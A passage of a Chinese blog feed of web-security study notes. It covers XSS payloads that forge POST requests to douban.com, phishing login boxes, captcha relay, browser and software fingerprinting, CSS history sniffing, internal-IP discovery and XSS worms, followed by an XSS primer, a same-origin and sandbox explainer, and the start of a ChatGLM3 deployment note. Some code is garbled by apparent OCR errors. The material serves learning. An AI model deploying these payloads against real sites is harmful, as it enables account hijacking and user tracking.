class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;form&quot;</span>);</span><br><span class="line">f.<span class="property">action</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">f.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span class="string">&quot;input&quot;</span>);</span><br><span class="line">i1.<span class="property">name</span> = <span class="string">&quot;ck&quot;</span>;</span><br><span class="line">i1.<span class="property">value</span> = <span class="string">&quot;JiUY&quot;</span>;</span><br><span class="line">f.<span class="title function_">appendchi1d</span>(i1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input”);</span></span><br><span class="line"><span class="string">i2.name = &quot;</span> mb_text<span class="string">&quot;;</span></span><br><span class="line"><span class="string">i2.value = &quot;</span>testtesttest<span class="string">&quot;;</span></span><br><span class="line"><span class="string">f.appendchild(i2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f.submit();</span></span><br></pre></td></tr></table></figure><blockquote><p>如果表单的参数很多的话，通过构造DOM 节点的方式，代码将会非常冗长。所以可以使用第二种方法，直接写HTML代码，这样会使得整个代码精简很多。</p></blockquote></li><li><p>b. 直接构造HTML代码，如下所示:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = doeument.<span class="property">createElement</span> (<span class="string">&quot;div&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendchild</span>(dd);</span><br><span class="line">dd.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;xssform&quot; name=&quot;mbform&quot;&gt; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type =<span class="string">&quot;hidden&quot;</span> value = <span class="string">&quot;JiUY&quot;</span> name=<span class="string">&quot;ck&quot;</span>/&gt;<span class="string">&#x27; + </span></span><br><span class="line"><span class="string">&#x27;</span>&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;testtesttest&quot;</span> name = <span class="string">&quot;mb_text”/&gt;&#x27; + </span></span><br><span class="line"><span class="string">&#x27;&lt;/form&gt;&#x27;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>xssform<span class="string">&quot;).submit();</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>2）通过 XMLHttpRequest 发送一个 POST 请求</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://www.douban.com&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">&quot;ck=JiUY &amp;mb text-test1234&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> ajax =nul1;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpReguest</span>)&#123;</span><br><span class="line">    ajax =<span class="keyword">new</span> <span class="title class_">XMLRttpRequest</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">Activexobject</span>)&#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> <span class="title class_">ActiveXobjeet</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.<span class="property">setRequestHeader</span> (<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>(postStr);</span><br><span class="line"></span><br><span class="line">ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.<span class="property">readystate</span>- <span class="number">4</span>&amp;&amp; ajax.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h1><p>XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”，当出现需要与用户进行交互的情况是，如：碰到验证码、修改密码时需要输入旧密码，XSS Payload就会失效。</p><p>但我们可以通过其他方法来进行攻击：</p><ul><li>验证码：XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施。攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</li><li>修改密码：攻击者可以将XSS与”钓鱼”结合。如：利用 Javascript 在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</li></ul><h1 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h1><p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。</p><p>如何通过JavaScript脚本识别浏览器版本呢？</p><ol><li><p><strong>通过XSS 读取浏览器的UserAgent对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);</span><br></pre></td></tr></table></figure><p>但是userAgent是可以伪造的，同时浏览器的一些拓展也可以屏蔽或自定义UA，这个信息不一定准确。</p></li><li><p><strong>根据浏览器之间的差异识别</strong></p><p>根据每种浏览器独有的对象特征识别浏览器的大版本</p></li></ol><h1 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h1><p>知道用户使用的浏览器、操作系统后，可以通过各种方法<strong>识别用户安装了的软件</strong></p><ol><li><p><strong>通过浏览器控件的classid检测相应软件</strong></p><p>可以通过判断软件对应控件的classid是否存在，来判断用户是否安装了该软件</p><p>如下代码检测迅雷的控件 <code>XunLeiBHO.ThunderIEHelper</code> ，如果存在，用户大概率也安装了迅雷软件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;XunLeiBHO.ThunderIEHelper&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">  <span class="comment">//异常了，不存在该控件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本</strong>。</p></li><li><p><strong>通过第三方软件</strong></p><p>如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript</p></li><li><p><strong>其他</strong></p><p>在Chrome中有一个特殊的协议: chrome:&#x2F;&#x2F; ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome://flashgot/skin/icon32.png</span><br></pre></td></tr></table></figure><p>扫描Chrome扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p></li></ol><h1 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h1><p>通过CSS，来<strong>发现用户曾经访问过的网站</strong></p><p>如果用户曾经访问过某个链接，那么这个链接的颜色会和未访问过的链接颜色不一致。</p><p>对应的POC代码见《白帽子讲web安全》P58</p><p>搜索引擎好像没有这个情况了，但是google scholar仍然存在，访问过的为紫色</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240229200958088.png" alt="image-20240229200958088"></p><h1 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h1><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢?</p><p>可以通过XSS Payload获取客户端的本地IP地址。</p><p><strong>javascript本身并没有获取本地IP地址的能力。</strong>一般需要第三方软件来完成。</p><p>比如，客户端安装了Java环境(JRE)，那么XSS就可以通过调用J ava Applet 的接口获取客户端的本地IP地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AttackAPI</span>.<span class="property">dom</span>.<span class="property">getInternalIP</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> sock = <span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">Socket</span>();</span><br><span class="line">      sock.<span class="title function_">bind</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">0</span>));</span><br><span class="line">      sock.<span class="title function_">connect</span>(<span class="keyword">new</span> java.<span class="property">net</span>.<span class="title class_">InetSocketAddress</span>(<span class="variable language_">document</span>.<span class="property">domain</span>,(!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>)?<span class="number">80</span>:<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span>));</span><br><span class="line">      <span class="keyword">return</span> sock.<span class="title function_">getLocalAddress</span>().<span class="title function_">getHostAddress</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有两个通过API获取本地网络信息的API见《白帽子讲web安全》P61</p><h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><ol><li><p><strong>定义</strong></p><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，破坏力和影响力巨大。XSS蠕虫借助 Ajax技术实现对Web应用程序中存在的 XSS 漏洞进行自动化利用传播，它可以将一些用户数据信息发送给Web应用程序然后再将自身代码传递进入Web应用程序，等到被感染用户访问Web应用程序时，蠕虫自身将又开始进行数据发送感染。</p></li><li><p><strong>应用场景与条件</strong></p><p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSSWorm攻击。比如，发送站内信、用户留言等页面，都是xss worm的高发区。</p><blockquote><p>如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p></blockquote></li><li><p><strong>例子</strong></p><ul><li><p><strong>第一个重量级的XSS worm —— Samy worm</strong></p><p>通过在标签的style属性上构造XSS蠕虫</p><p>解析：<a href="https://www.cnblogs.com/milantgh/p/3655070.html">https://www.cnblogs.com/milantgh/p/3655070.html</a></p></li><li><p>百度空间蠕虫</p><p>在CSS代码后插入js代码</p><p>解析：<a href="https://blog.csdn.net/qq_33605106/article/details/79756478">https://blog.csdn.net/qq_33605106/article/details/79756478</a></p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨站脚本攻击 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS简介</title>
      <link href="/posts/13a2.html"/>
      <url>/posts/13a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h1><p>XSS全称是Cross Site Scripting，中文为<strong>跨站脚本攻击</strong>，为了和CSS（层叠样式表（<code>Cascading Style Sheets，CSS</code>））区分命名为XSS。</p><p>XSS的原理：在HTML页面中注入恶意脚本，当目标网站目标用户的浏览器渲染HTML文档时，恶意脚本执行，使得黑客可以控制用户浏览器。</p><p>一个简单的例子：</p><p>有一个网页，会将用户输入的内容回显在页面上。</p><p>如果我们在该网页输入如下脚本，脚本的作用就是弹出一个对话框显示用户的Cookie信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果目标服务器没有对这个输入进行检验就直接将其显示在页面上的话，则会生成如下形式的页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这段脚本已经成功嵌入到该页面当中。</p><p>当受害浏览器访问这个页面的时候，这段脚本也将被认为是页面的一部分，从而<strong>被执行</strong>，即弹出对话框显示受害浏览器的Cookie信息。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>根据效果的不同，XSS攻击主要可以分为以下几类：</p><h2 id="反射型XSS（非持久型XSS）"><a href="#反射型XSS（非持久型XSS）" class="headerlink" title="反射型XSS（非持久型XSS）"></a>反射型XSS（非持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>一般情况下，黑客发送给别人发送<strong>带有恶意脚本代码参数的 <code>url</code></strong> ，当用户打开这个带有恶意代码参数的 <code>url</code> 地址时，恶意脚本代码作为输入提交到服务器端，服务器端解析后响应，恶意代码被目标服务器通过<strong>错误信息、搜索结果等等方式“反射”</strong>回显在用户的浏览器上，浏览器解析执行XSS代码。</p><blockquote><p>场景：一般会出现在查询类页面等。</p><p>这种网站一般会显示用户的输入，用户点开会恶意代码参数就会显示在网站上并执行。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>非持久性。攻击脚本不会写入网站的数据库，是一次性的攻击。所以黑客一般需要诱骗用户点击包含攻击脚本的 URL，才能攻击成功。</li><li>需要传递给服务器，通过服务器反射恶意脚本</li></ul></li><li><p><strong>例子</strong></p><p>假设网站有一个搜索功能，该功能接收URL参数中用户提供的搜索词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=gift</span><br></pre></td></tr></table></figure><p>网站在对这个URL的响应中，回显用户提供的搜索词</p><p>假设应用程序不对数据进行任何其他处理，攻击者就可以构造如下的url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他用户访问这个url的时候，对应渲染出来的html应该为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户的浏览器就会执行script内部的恶意代码</p></li></ol><h2 id="存储型XSS（持久型XSS）"><a href="#存储型XSS（持久型XSS）" class="headerlink" title="存储型XSS（持久型XSS）"></a>存储型XSS（持久型XSS）</h2><ol><li><p><strong>原理</strong></p><p>黑客利用XSS 漏洞，将内容经正常功能提交进入目标服务器端的数据库中并持久保存。当正常用户请求目标页面时，前端页面获得后端从数据库中读出的注入代码，恰好将其渲染执行。</p><blockquote><p>场景：一般存在于 Form 表单提交等交互功能，如发帖留言，注册页面等。</p></blockquote></li><li><p><strong>特点</strong></p><ul><li>稳定性：恶意脚本存入网站服务器端</li></ul></li><li><p><strong>例子</strong></p><p>黑客写下一篇包含有恶意JavaScript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。</p></li></ol><h2 id="DOM-based型XSS"><a href="#DOM-based型XSS" class="headerlink" title="DOM-based型XSS"></a>DOM-based型XSS</h2><ol><li><p><strong>原理</strong></p><p>从效果来看，DOM-based型XSS也属于反射型，但是其形成的原因比较特殊，所以单独拿出来介绍。</p><p><strong>通过DOM操作前端代码输出</strong>的时候形成的XSS为DOM-based型XSS</p><p>客户端的脚本<strong>通过DOM动态地输出数据到页面</strong>而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行。</p><blockquote><p>场景：一般产生于用户能够进行参数输入查询的地方</p><p><strong>网站本地执行url中的参数而并不传给服务器</strong></p></blockquote></li><li><p><strong>特点</strong></p><ul><li>不与后台服务器产生数据交互</li><li>无法从服务器端进行防御。因为构造的url中的恶意代码参数并不传给服务器，而是客户端获得DOM中的数据直接在本地执行，服务器无法检测到。</li><li>通过客户端脚本在浏览器端触发</li></ul></li><li><p><strong>例子</strong></p><p>有一个网站，包含一个搜索框，用户输入关键字并点击搜索按钮，搜索结果会显示在页面上。网站使用JavaScript来获取URL中的搜索词并将其显示在页面上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/1637811827_619f06737e8996f4cbccd.png" alt="img"></p><p>可以看到网站直接通过document.write从url中提取参数并将参数打印在网页上，而并没有将参数传给服务器</p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用户访问该url时直接本地执行xss代码</p></li></ol><h1 id="XSS攻击学习平台"><a href="#XSS攻击学习平台" class="headerlink" title="XSS攻击学习平台"></a>XSS攻击学习平台</h1><ul><li>Attack API</li><li>BeEF</li><li>XSS-Proxy</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨站脚本攻击 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『浏览器安全』浏览器同源策略与沙箱</title>
      <link href="/posts/77ff.html"/>
      <url>/posts/77ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="同源策略的定义"><a href="#同源策略的定义" class="headerlink" title="同源策略的定义"></a>同源策略的定义</h2><p>我们的浏览器出于安全考虑，只允许与<strong>本域</strong>下的接口交互。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</p><h2 id="同源策略的应用"><a href="#同源策略的应用" class="headerlink" title="同源策略的应用"></a>同源策略的应用</h2><p>如果没有同源策略，别人就可以轻松的获取我们网站的 cookie 信息， 或是对网页进行DOM操作，可能会造成数据被盗取等后果。</p><p>例如，它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，从第三方网络邮件服务（用户已登录）或公司内网（因没有公共 IP 地址而受到保护，不会被攻击者直接访问）读取数据，并将这些数据转发给攻击者</p><h2 id="本域与跨域"><a href="#本域与跨域" class="headerlink" title="本域与跨域"></a>本域与跨域</h2><p>在<strong>同一个协议、主机、端口</strong>下的页面属于同一个域（即本域），否则就是跨域。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240125204517169.png" alt="image-20240125204517169"></p><blockquote><p>同主机：表示的是主机名相同，而并不是域名。比如上面的例子，第一个例子的主机名为 <code>store.company.com</code> ，最后一个例子的主机名为 <code>news.company.com</code> ，两个例子的主机名不相同，但是域名均为 <code>company.com</code> ，不同源</p></blockquote><p>如果是以下两个链接进行数据交互，可以通过同源策略的检测，允许交互：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.angular.cn:80/guide/inputs-outputs</span><br><span class="line">https://www.angular.cn:80/guide/index</span><br></pre></td></tr></table></figure><p>而如果是以下这样的链接交互数据，则不能通过同源策略的检测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.child.a.com/test/index.html ----失败，域名不同</span><br><span class="line">https://www.a.com/test/index.html ----失败，协议不同</span><br><span class="line">http://www.a.com:8080/test/index.html ----失败，端口号不同</span><br></pre></td></tr></table></figure><p>所以就会牵引出一个问题，<strong>不同源的数据如何进行交互？</strong></p><h2 id="跨域数据交互问题"><a href="#跨域数据交互问题" class="headerlink" title="跨域数据交互问题"></a>跨域数据交互问题</h2><p>如何跨域加载资源？</p><ol><li><p><strong>一些特殊的标签</strong></p><p><code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签可以跨域加载资源</p><p>如：可以通过下面的代码访问其他域下的脚本文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过jsonp来实现跨域请求</strong></p></li><li><p><strong>通过CORS（跨域资源共享）实现跨域请求</strong></p></li><li><p><strong>通过代理实现跨域请求</strong><br>我们都知道同源策略是浏览器自带的，那么我们如果要避免同源策略进行跨域请求，我们可以通过代理服务器的方式进行请求，例如我们请求一个与自身不同域的脚本文件，那么我们可以<strong>先请求与自身同域的一个 url ，然后通过代理服务器进行跳转， 最后返回由代理服务器请求到的脚本文件</strong></p></li></ol><blockquote><p>详细的例子归纳见：<a href="https://blog.csdn.net/l_ppp/article/details/106402136">https://blog.csdn.net/l_ppp/article/details/106402136</a></p></blockquote><h2 id="浏览器第三方插件的同源策略"><a href="#浏览器第三方插件的同源策略" class="headerlink" title="浏览器第三方插件的同源策略"></a>浏览器第三方插件的同源策略</h2><p>对于浏览器来说，浏览器加载的一些第三方插件也有各自的同源策略。</p><p>最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p><h1 id="浏览器沙箱（sandbox）"><a href="#浏览器沙箱（sandbox）" class="headerlink" title="浏览器沙箱（sandbox）"></a>浏览器沙箱（sandbox）</h1><p>以chrome浏览器为例，采用了<strong>多进程架构</strong>，主要进程包括：浏览器进程、渲染进程、插件进程和拓展进程。插件进程如flash、java、pdf 等与浏览器进程严格隔离，因此不会互相影响。</p><p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程或操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p><p>Sandbox（沙箱）：</p><ul><li><p>原理：Sandbox 的设计目的是为了<strong>让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。</strong>如果<strong>一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性</strong>。</p></li><li><p>应用实例：比如一个提供 hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个 Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p></li></ul><p>浏览器所加载的一些第三方插件往往不收sandbox管辖，近年来大部分的浏览器漏洞都是<strong>加载第三方插件</strong>导致的。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/zhengna/p/11428822.html">https://www.cnblogs.com/zhengna/p/11428822.html</a></li><li><a href="https://blog.csdn.net/t0410ch/article/details/125150202">https://blog.csdn.net/t0410ch/article/details/125150202</a></li><li><a href="https://blog.csdn.net/u012861467/article/details/79530629">https://blog.csdn.net/u012861467/article/details/79530629</a></li><li><a href="https://cloud.tencent.com/developer/article/1878652">https://cloud.tencent.com/developer/article/1878652</a></li><li><a href="https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html">https://www.cnblogs.com/edisonchou/p/edc_web_security_foundation_notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/348948397">https://zhuanlan.zhihu.com/p/348948397</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『大模型』本地部署chatglm3-6b</title>
      <link href="/posts/d5ac.html"/>
      <url>/posts/d5ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>ChatGLM3-6B发布于2023年10月27日，是目前中文能力排名最高的开源LLM模型。对应项目的github地址：<a href="https://github.com/THUDM/ChatGLM3">https://github.com/THUDM/ChatGLM3</a></p><p>实验室项目中需要本地部署大模型用于新闻文本摘要任务，因为预测速度的要求及硬件条件的限制，比较后选择该模型的6B版本。</p><p>本文为在linux环境下的chatglm3-6b的本地部署工程记录。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="CUDA与CUDNN"><a href="#CUDA与CUDNN" class="headerlink" title="CUDA与CUDNN"></a>CUDA与CUDNN</h2><p>深度学习任务中，当使用GPU进行训练的时候，需要安装英伟达提供的驱动和显卡对应的cuda、cudnn。</p><h3 id="什么是cuda和cudnn？"><a href="#什么是cuda和cudnn？" class="headerlink" title="什么是cuda和cudnn？"></a>什么是cuda和cudnn？</h3><ul><li>CUDA(ComputeUnified Device Architecture)：是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。</li><li>CUDNN：是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA 